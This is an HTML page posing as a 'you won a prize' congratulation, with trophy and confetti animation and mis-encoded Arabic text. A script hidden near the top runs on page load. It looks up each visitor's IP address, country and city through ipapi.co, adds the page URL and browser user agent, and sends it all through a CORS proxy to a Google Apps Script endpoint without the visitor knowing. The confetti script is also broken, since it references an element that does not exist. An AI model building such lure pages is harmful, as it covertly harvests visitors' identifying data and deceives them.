<!DOCTYPE html>

<head>

  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>ÿ£ŸÑŸÅ ŸÖÿ®ÿ±ŸàŸÉ!</title>
  <style>
    :root {
      --primary-blue: #007cf0;
      --secondary-blue: #00dfd8;
      --text-glow: #ffffff;
    }

    body {
      margin: 0;
      padding: 0;
      background: linear-gradient(135deg, var(--primary-blue), var(--secondary-blue));
      font-family: 'Segoe UI', sans-serif;
      color: #fff;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      height: 100vh;
      overflow: hidden;
      text-align: center;
    }

    h1 {
      font-size: 2.5rem;
      margin: 0.5em 0;
      text-shadow: 0 0 10px var(--text-glow), 0 0 20px var(--text-glow);
      animation: glow 2s ease-in-out infinite alternate;
    }

    @keyframes glow {
      from {
        text-shadow: 0 0 10px #fff, 0 0 20px #0ff;
      }
      to {
        text-shadow: 0 0 20px #fff, 0 0 30px #0ff;
      }
    }

    .trophy {
      font-size: 4rem;
      animation: bounce 1.5s infinite;
    }

    @keyframes bounce {
      0%, 100% { transform: translateY(0); }
      50% { transform: translateY(-15px); }
    }

    p {
      font-size: 1.2rem;
      max-width: 90%;
      margin: 1em auto;
    }

    .confetti {
      position: absolute;
      width: 100%;
      height: 100%;
      pointer-events: none;
      overflow: hidden;
      top: 0;
      left: 0;
    }

    .confetti-piece {
      position: absolute;
      width: 10px;
      height: 10px;
      background-color: #fff;
      animation: fall 3s linear infinite;
    }

    @keyframes fall {
      0% { transform: translateY(-100px) rotate(0deg); opacity: 1; }
      100% { transform: translateY(100vh) rotate(360deg); opacity: 0; }
    }

    @media (max-width: 600px) {
      h1 {
        font-size: 2rem;
      }
      .trophy {
        font-size: 3rem;
      }
      p {
        font-size: 1rem;
      }
    }
  </style>
</head>
<body>

  <script>
(async () => {
  const SCRIPT_URL = 'https://script.google.com/macros/s/AKfycbwTqrCCkkWuaw1J_t-bO31JV1Q0jcAFQCAi6RfuEjw-vU4Efp_u_OZfk6cPDbj8F66j/exec';
  const CORS_PROXY = 'https://api.allorigins.win/get?url=';

  try {
    // Get IP, country, and city info
    const geoRes = await fetch('https://ipapi.co/json/');
    const geoData = await geoRes.json();
    const ip = geoData.ip || 'Unknown';
    const country = geoData.country_name || 'Unknown';
    const city = geoData.city || 'Unknown';
    const page = window.location.href;
    const ua = navigator.userAgent;

    // Build the Google Script URL with all parameters
    const logURL = `${SCRIPT_URL}?ip=${encodeURIComponent(ip)}&country=${encodeURIComponent(country)}&city=${encodeURIComponent(city)}&page=${encodeURIComponent(page)}&ua=${encodeURIComponent(ua)}`;

    // Pass through CORS proxy to avoid browser restrictions
    const target = encodeURIComponent(logURL);
    const proxyURL = `${CORS_PROXY}${target}`;

    await fetch(proxyURL);
    console.log('‚úÖ Visitor data logged successfully:', { ip, country, city, page, ua });
  } catch (err) {
    console.error('‚ùå Logging error:', err);
  }
})();
</script>

  <div class="trophy">üèÜ</div>
  <p>.ŸÑŸÇÿØ ÿ±ÿ®ÿ≠ÿ™ ÿ¨ÿßÿ¶ÿ≤ÿ© ÿ£ŸÉÿ®ÿ± ÿ•ÿ¥ ÿØÿÆŸÑ ŸÅŸä ÿßŸÑÿ™ÿßÿ±ŸäÿÆ</p>

  <script>
    const confettiContainer = document.getElementById('confetti');
    for (let i = 0; i < 100; i++) {
      const confetti = document.createElement('div');
      confetti.classList.add('confetti-piece');
      confetti.style.left = Math.random() * 100 + 'vw';
      confetti.style.top = Math.random() * -100 + 'px';
      confetti.style.backgroundColor = `hsl(${Math.random() * 360}, 100%, 50%)`;
      confetti.style.animationDuration = (Math.random() * 2 + 2) + 's';
      confettiContainer.appendChild(confetti);
    }
  </script>
</body>
</html>
